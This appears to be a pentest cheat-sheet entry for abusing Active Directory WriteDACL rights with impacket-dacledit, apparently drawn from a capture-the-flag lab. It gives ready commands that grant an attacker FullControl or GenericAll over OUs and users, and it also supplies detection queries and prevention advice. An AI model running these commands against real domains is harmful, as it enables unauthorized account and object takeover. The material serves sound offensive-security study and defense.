name: impacket-dacledit (DACL Editing)
description: Modify the Discretionary Access Control List (DACL) on an AD object (user, group, OU, or container) to grant arbitrary permissions. With WriteDACL over a target, you can grant yourself FullControl, GenericAll, or specific rights like WriteProperty. Commonly used in ACL abuse chains to escalate from WriteDACL to full object control.
notes:
=== THE IDEA ===
WriteDACL lets you add new ACEs to an object's DACL. impacket-dacledit
writes FullControl (or specific rights) for your principal on the target
object. This is the bridge between WriteDACL and full control.

=== GRANT FULLCONTROL ON AN OU ===
  impacket-dacledit -action write -rights FullControl -inheritance \
    -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' \
    -dc-ip <dc_ip> '<domain>/john' -hashes ':<nt_hash>'
  # -inheritance means child objects inherit the ACE

=== GRANT GENERICALL ON A USER ===
  impacket-dacledit -action write -rights GenericAll \
    -principal 'attacker' -target 'victim' \
    -dc-ip <dc_ip> '<domain>/attacker:<password>'

=== RESTORE (cleanup) ===
  impacket-dacledit -action restore -file dacledit-YYYYMMDD-HHMMSS.bak \
    -dc-ip <dc_ip> '<domain>/attacker:<password>'
  # The backup file is created automatically on each write

=== NOTES ===
- Objects with adminCount=1 do NOT inherit ACEs from parent OUs (AdminSDHolder protection)
- The tool creates a .bak file on each write for restoration
- Use -inheritance flag when you need the ACE to propagate to child objects

examples.label: Grant FullControl on an OU with inheritance
Grant GenericAll on a user with password auth

recommended.note: If you have WriteOwner instead of WriteDACL, take ownership first, then you get implicit WriteDACL.
Once you have FullControl, Shadow Credentials takes the account.

defense.why_it_works: WriteDACL permission allows adding new ACEs to the object's security descriptor. The attacker grants themselves FullControl, then pivots through password reset, Shadow Credentials, or other write-based attacks.
defense.prerequisites: WriteDACL over the target object (user, group, OU, or container).
defense.impact: Arbitrary permission grant on the target - effectively full control of any objects under the modified DACL.
defense.detection: [MITRE T1222.001] Event 5136 modifying nTSecurityDescriptor; Event 4662 with WriteProperty on the DACL.
defense.artifacts: 5136 DACL modification events; dacledit .bak backup file on attacker disk.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136 AttributeLDAPDisplayName="nTSecurityDescriptor"
| table _time, SubjectUserName, ObjectDN, OperationType
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136 and AttributeLDAPDisplayName == "nTSecurityDescriptor"
| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType
defense.prevention: Monitor nTSecurityDescriptor changes (5136) on sensitive OUs and objects; use AdminSDHolder; restrict WriteDACL delegation.

detections.name: DACL modification on AD object
detections.logic:
SecurityEvent
| where EventID == 5136 and AttributeLDAPDisplayName == "nTSecurityDescriptor"
| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType
| where Target contains "OU=" or Target contains "CN=Domain Admins"
detections.false_positives: Legitimate delegation changes by AD administrators
detections.tuning: Filter to sensitive OUs and high-value targets; baseline normal DACL changes
